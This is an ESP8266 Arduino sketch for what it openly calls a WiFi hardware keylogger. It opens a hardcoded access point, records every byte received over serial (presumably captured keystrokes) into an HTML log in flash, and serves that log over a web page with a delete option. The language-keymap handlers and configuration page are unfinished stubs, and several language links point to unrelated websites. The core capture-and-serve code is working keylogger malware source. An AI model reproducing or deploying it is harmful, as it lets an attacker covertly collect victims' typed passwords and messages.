#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
//#include <SPIFFSEditor.h>
#include <EEPROM.h>

#define BAUD_RATE 115200

const String delete_logs = "<a href=\"/delete\"><- DELETE LOGS</a><br><br></body></html>";

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "WiFiKeylogger";
const char *password = "hardwareKeylogger"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;
File logs;

void init_format() {
  logs.close();
  delay(1000);
  SPIFFS.format();
  logs = SPIFFS.open("/log.html", "a+");
  logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Seleccionar idioma: </p><form target=\"_blank\"><select name=\"list\"><option value=\"https://www.google.es\"> BE<option value=\"https://www.marca.com\"> CZ<option value=\"https://www.as.com\"> DA<option value=\"https://www.google.es\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"https://www.google.es\"> FI<option value=\"https://www.google.es\"> FR<option value=\"https://www.google.es\"> IT<option value=\"https://www.google.es\"> PT<option value=\"https://www.google.es\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>");
   
  
}

void setup() {
  
  Serial.begin(BAUD_RATE);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  init_format();
  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/log.html", "text/html");
  });

  server.on("/configuration", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Prueba de ventana de configuración");
  });

  server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
    init_format();
    request->send(200, "text/plain", "Logs cleared!");
  });

  server.on("/es", HTTP_GET, [](AsyncWebServerRequest *request){
    // Código keymap ES
    request->send(200, "text/plain", "Idioma español aplicado");
  });

  server.on("/en", HTTP_GET, [](AsyncWebServerRequest *request){
    // Código keymap ES
    request->send(200, "text/plain", "Idioma ingles aplicado");
  });
  
  server.begin();
}

void loop() {
  
  if(Serial.available()) {
    logs.write(Serial.read());
  }
}
